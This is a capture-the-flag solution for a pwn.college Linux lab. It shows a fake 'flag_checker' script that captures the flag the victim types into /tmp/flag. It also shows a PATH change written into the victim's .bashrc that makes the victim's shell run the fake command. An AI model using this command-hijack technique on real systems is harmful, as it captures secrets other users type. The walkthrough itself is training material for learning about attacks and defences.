In the previous level, you abused Zardus's `~/.bashrc` to make him run commands for you.

This time, Zardus doesn't keep the flag lying around in a readable file after he logs in. Instead he'll run a command named `flag_checker`, manually typing the flag into it for verification.

Your mission is to use your continued write access to Zardus's `.bashrc` to intercept this flag. Remember how you hijacked commands in the [Pondering PATH](https://pwn.college/linux-luminarium/path) module? Can you use that capability to hijack the `flag_checker`?

Create the `flag_checker` program

```bash
#!/bin/bash
echo "Type the flag"
read FLAG
echo "$FLAG" > /tmp/flag
```

Then modify the PATH variable in zardus' .bashrc file

```bash
export PATH="/home/hacker:$PATH"
```

Finally simulate the victim logging in with `/challenge/victim`




